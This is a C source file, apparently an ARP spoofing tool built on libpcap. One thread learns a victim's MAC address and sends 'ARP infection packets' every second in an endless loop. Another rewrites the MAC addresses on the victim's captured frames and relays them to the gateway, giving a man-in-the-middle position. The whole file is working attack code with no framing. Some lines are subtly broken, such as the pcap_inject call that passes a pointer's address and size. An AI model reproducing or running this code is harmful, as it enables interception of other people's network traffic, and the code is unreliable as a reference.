#include "pcaph.h"
#include "arph.h"

void *get_packet(){
    pcap_t *handle;
    bpf_u_int32 netaddr=0, mask=0;
    char *dev=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filter_exp[]="";
    int res=0;
    struct bpf_program fp;
    struct pcap_pkthdr *header;
    const struct sniff_ethernet *ethernet;
    const u_char *pkt_data;
    arphdr_t *arpHeader=NULL;
    int i;

    // define dev
    dev = pcap_lookupdev(errbuf);
    if(dev == NULL){
        fprintf(stderr, "[-] Device: %s\n", dev);
        return (void *)1;
    }

    // look up info from the capture dev
    if(pcap_lookupnet(dev, &netaddr, &mask, errbuf) == -1){

        mask=0;
    }

    printf("[+] Dev\t\t: %s\n", dev);
    
    // open dev
    handle = pcap_open_live(dev, BUFSIZ, 1, TIMEOUT, errbuf);
    if(handle == NULL){
        fprintf(stderr, "[-] Open dev: %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    // compile filter_exp into BPF filter program
    if(pcap_compile(handle, &fp, filter_exp, 0, netaddr) == -1){
        fprintf(stderr, "[-] Parsing filter: %s: %s\n", filter_exp, pcap_geterr(handle));
        return (void *)1; 
    }

    while((res=pcap_next_ex(handle, &header, (const u_char **)&pkt_data))>=0){
        if(res==0){
            printf("[*] Timeout\n");
            continue;
        }
        arpHeader = (struct arphdr *)(pkt_data+SIZE_ETHERNET); 
        
        if(ntohs(arpHeader->oper) == ARP_REPLY){
            printf("\n[+] Get sender mac: ");
            printMac(arpHeader->sha);
            break; 
        }
    }

    if(res == -1){
        fprintf(stderr, "[-] Reading packet: %s\n", pcap_geterr(handle));
        return (void *)1;
    }else{
        arpArgv.arpop=ARP_REPLY;
        for(i=0; i<MAC_LEN; i++)
            arpArgv.senderMac[i]=(unsigned int)arpHeader->sha[i];
        
        while(1){
            printf("[+] Sending ARP infection packet\n\n");
            arpRequest();
            sleep(1);
        }
    }
    return (void *)0;
}

void *relay_packet(){
    pcap_t *handle;
    bpf_u_int32 netaddr=0, mask=0;
    char *dev=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filter_exp[]="";
    int res=0;
    struct bpf_program fp;
    struct pcap_pkthdr *header;
    struct sniff_ethernet *ethernet;
    const u_char *pkt_data;
    arphdr_t *arpHeader=NULL;
    int i;

    // define dev
    dev = pcap_lookupdev(errbuf);
    if(dev == NULL){
        fprintf(stderr, "[-] Device: %s\n", dev);
        return (void *)1;
    }

    // look up info from the capture dev
    if(pcap_lookupnet(dev, &netaddr, &mask, errbuf) == -1){
        mask=0;
    }
    
    // open dev
    handle = pcap_open_live(dev, BUFSIZ, 1, TIMEOUT, errbuf);
    if(handle == NULL){
        fprintf(stderr, "[-] Open dev: %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    // compile filter_exp into BPF filter program
    if(pcap_compile(handle, &fp, filter_exp, 0, netaddr) == -1){
        fprintf(stderr, "[-] Parsing filter: %s: %s\n", filter_exp, pcap_geterr(handle));
        return (void *)1; 
    }

    while((res=pcap_next_ex(handle, &header, (const u_char **)&pkt_data))>=0){
        if(res==0){
            printf("[*] Timeout\n");
            continue;
        }

        ethernet = (struct sniff_ethernet *)(pkt_data);

        if(macCompare(ethernet->ether_shost, (unsigned char *)arpArgv.senderMac)){
            FILE *pipe;
            unsigned char cmdLine[BUFSIZ], tmp[BUFSIZ];

            memset(tmp, 0, sizeof(tmp));
            memset(cmdLine, 0, sizeof(cmdLine));

            pipe = popen("ip route show default | awk '/default/ {print $3}'", "r");
            if(pipe == NULL){
                fprintf(stderr, "[-] popen\n");
                return (void *)1;
            }
            if((fgets(tmp, BUFSIZ, pipe))==NULL){
                fprintf(stderr, "[-] Get gateway: %s\n", tmp);
                return (void *)1;
            }
            tmp[strlen(tmp)-1]='\0';
            pclose(pipe);

            sprintf(cmdLine, "arp -n | awk '/%s/ {print $3}'", tmp);
            setMacAddress(cmdLine, ethernet->ether_dhost);
            printf("\n[+] Set dst mac to gateway mac:\t");
            printMac(ethernet->ether_dhost);

            memset(cmdLine, '\0', sizeof(cmdLine));
            sprintf(cmdLine, "ifconfig | awk '/HWaddr/ {print $5}'");
            setMacAddress(cmdLine, ethernet->ether_shost);
            printf("[+] Set src mac to own mac:\t");
            printMac(ethernet->ether_shost);

            if (pcap_inject(handle, &pkt_data, sizeof(pkt_data)) == -1){
                fprintf(stderr, "[-] Error sending the packet\n");
                return (void *)1;
            }
            printf("=======================RELAY=========================\n");
        }
        
    }

    if(res == -1){
        fprintf(stderr, "[-] Reading packet: %s\n", pcap_geterr(handle));
        return (void *)1;
    }

    return (void *)0;

}

void setMacAddress(unsigned char* cmdLine, unsigned char* output){
    FILE *pipe;
    unsigned char tmp[BUFSIZ];
    memset(tmp, '\0', sizeof(tmp));

    pipe = popen(cmdLine, "r");
    if(pipe == NULL){
        fprintf(stderr, "[-] popen\n");
        return;
    }

    if((fgets(tmp, BUFSIZ, pipe))==NULL){
        fprintf(stderr, "[-] Get mac: %s\n", tmp);
        return;
    }

    tmp[strlen(tmp)-1]='\0';
    pclose(pipe);

    sscanf(tmp, "%02X:%02X:%02X:%02X:%02X:%02X",\
            (unsigned int *)&output[0],\
            (unsigned int *)&output[1],\
            (unsigned int *)&output[2],\
            (unsigned int *)&output[3],\
            (unsigned int *)&output[4],\
            (unsigned int *)&output[5]);
}

int macCompare(unsigned char *sMac, unsigned char *arpMac){
    int i=0;

    for(i=0; i<MAC_LEN; i++){
        if(sMac[i] != arpMac[i]){
            return 0;
        }
    }
    return 1;
}